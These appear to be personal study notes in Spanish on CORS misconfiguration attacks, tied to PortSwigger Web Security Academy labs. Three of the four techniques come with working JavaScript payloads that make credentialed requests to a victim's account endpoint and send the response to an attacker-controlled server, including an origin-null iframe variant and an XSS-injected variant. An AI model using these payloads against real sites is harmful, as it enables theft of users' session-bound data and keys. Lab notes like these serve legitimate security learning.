# Cross-origin resource sharing (CORS)
Es un ataque sobre la conexion entre los dominios

# Vulnerabilidades comunes
1. CSRF por validacion de origin
```
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://0a5e001604755cf383449114000100a9.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();k

function reqListener() {
	location='https://exploit-0a19000c04eb5cb7831d901401560077.exploit-server.net/exploit?key='+this.responseText;
};
</script>
```
2. Origin null
```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='malicious-website.com/log?key='+this.responseText;
};
</script>"></iframe>
```
3. Bypasear el origin agregando nuestro dominio como sufijo o prefijo
4. Cambiar https por http
```
<script>
    document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```
